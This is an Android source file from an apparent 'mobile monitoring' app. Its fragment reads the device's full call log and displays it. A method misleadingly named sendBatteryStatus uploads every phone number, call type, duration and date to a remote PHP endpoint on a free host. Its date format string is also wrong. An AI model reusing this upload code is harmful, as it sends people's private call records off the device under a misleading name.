package com.makersinn.mobilemonitoring.tabfragments;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.makersinn.mobilemonitoring.CallLogModelClass;
import com.makersinn.mobilemonitoring.R;
import com.makersinn.mobilemonitoring.adapters.CallLogListAdapters;
import com.makersinn.mobilemonitoring.modal.ContactModal;

import org.json.JSONArray;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import static android.content.ContentValues.TAG;

/**
 * Created by FreedomRider on 2/21/2019.
 */

public class CallLogFragment extends Fragment {


    TextView callLog;
ArrayList<CallLogModelClass> callLogList=new ArrayList<>();
    public CallLogFragment() {

    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View view = inflater.inflate(R.layout.fragment_call_log, container, false);

        callLog=view.findViewById(R.id.callLog);

        if (ContextCompat.checkSelfPermission(getActivity(),

                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {

            if (ActivityCompat.shouldShowRequestPermissionRationale(getActivity(),

                    Manifest.permission.READ_CALL_LOG)) {

                ActivityCompat.requestPermissions(getActivity(),

                        new String[]{Manifest.permission.READ_CALL_LOG}, 1);
            }
            else {

                ActivityCompat.requestPermissions(getActivity(),

                        new String[]{Manifest.permission.READ_CALL_LOG}, 1);
            }
        }
        else {
            //Do stuff
            callLog.setText(getCallDetail());
        }

        return view;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {

        switch (requestCode) {

            case 1: {

                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    if (ContextCompat.checkSelfPermission(getActivity().getApplicationContext(),

                            Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {

                        Toast.makeText(getActivity().getApplicationContext(), "Permission granted",
                                Toast.LENGTH_LONG).show();

                        callLog.setText(getCallDetail());


                    }
                }
                else {
                    Toast.makeText(getActivity().getApplicationContext(), "Permission not granted",
                            Toast.LENGTH_LONG).show();
                }
                return;
            }
        }
    }
    private String getCallDetail() {

        StringBuffer sb = new StringBuffer();

        if (ActivityCompat.checkSelfPermission(getActivity().getApplicationContext(),

                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {

        }
        Cursor manageCursor = getActivity().getContentResolver().

                query(CallLog.Calls.CONTENT_URI, null,

                null, null, null);

        int number=manageCursor.getColumnIndex(CallLog.Calls.NUMBER);

        int type=manageCursor.getColumnIndex(CallLog.Calls.TYPE);

        int date=manageCursor.getColumnIndex(CallLog.Calls.DATE);

        int duration=manageCursor.getColumnIndex(CallLog.Calls.DURATION);


        while (manageCursor.moveToNext())
        {

            String phNmbr=manageCursor.getString(number);

            String phType=manageCursor.getString(type);

            String phdate=manageCursor.getString(date);

            String phduration=manageCursor.getString(duration);

            Date callDayTime=new Date(Long.valueOf(phdate));

            SimpleDateFormat formator=new SimpleDateFormat("DD-MM-YY HH:MM");

            String dateString=formator.format(callDayTime);

            String dir=null;

            int dircode=Integer.parseInt(phType);

            switch (dircode)
            {
                case CallLog.Calls.OUTGOING_TYPE:

                    dir="OutGoing";

                    break;

                case CallLog.Calls.INCOMING_TYPE:

                    dir="InComing";

                    break;

                case CallLog.Calls.MISSED_TYPE:

                    dir="Missed";

                    break;
            }

            sb.append("\nPhone number   "+phNmbr+"\nCallType   "+dir+"\nCall duration   "+phduration+

                    "\nCall Date   "+dateString);

            sb.append("\n\n...............\n");
            CallLogModelClass callLog=new CallLogModelClass();
            callLog.setPhoneNo(phNmbr);
            callLog.setCallDuration(phduration);
            callLog.setCallTDate(phdate);
            callLog.setCallType(dir);
            callLogList.add(callLog);


        }

        manageCursor.close();

        return sb.toString();
    }
    private void sendBatteryStatus()
    {
        String url="https://incurrable-twine.000webhostapp.com//Mobile/CallLog.php";
        RequestQueue queue = Volley.newRequestQueue(getActivity());  // this = context
        final ProgressDialog progressDialog=new ProgressDialog(getActivity());
//        progressDialog.setMessage("Updating Bettery please wait");
//        progressDialog.show();
        StringRequest postRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>()
                {
                    @Override
                    public void onResponse(String response) {
//                        progressDialog.dismiss();
                        Toast.makeText(getActivity().getApplicationContext(),""+response,Toast.LENGTH_LONG).show();
                        // response
                        Log.d("Response", response);
                    }
                },
                new Response.ErrorListener()
                {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // error
//                         Log.d("Error.Response", response);
                    }
                }
        ) {
            @Override
            protected Map<String, String> getParams()
            {
                ArrayList<String> nmbers=new ArrayList<>();
                ArrayList<String> callType=new ArrayList<>();
                ArrayList<String> callDuration=new ArrayList<>();
                ArrayList<String> callDate=new ArrayList<>();
                for (int i=0;i<callLogList.size();i++)
                {
                    nmbers.add(callLogList.get(i).getPhoneNo());
                    callType.add(callLogList.get(i).getCallType());
                    callDate.add(callLogList.get(i).getCallTDate());
                    callDuration.add(callLogList.get(i).getCallDuration());
                }

                JSONArray jsonArray=new JSONArray(nmbers);
                String num=jsonArray.toString();
                JSONArray jsonArray1=new JSONArray(callType);
                String type=jsonArray1.toString();
                JSONArray jsonArray2=new JSONArray(callDuration);
                String duration=jsonArray2.toString();
                JSONArray jsonArray3=new JSONArray(callDate);
                String date=jsonArray3.toString();



                Map<String, String>  params = new HashMap<String, String>();
                params.put("phone_no", num);
                params.put("call_type", type);
                params.put("call_duration", duration);
                params.put("call_date", date);


                return params;
            }
        };
        queue.add(postRequest);

    }
}



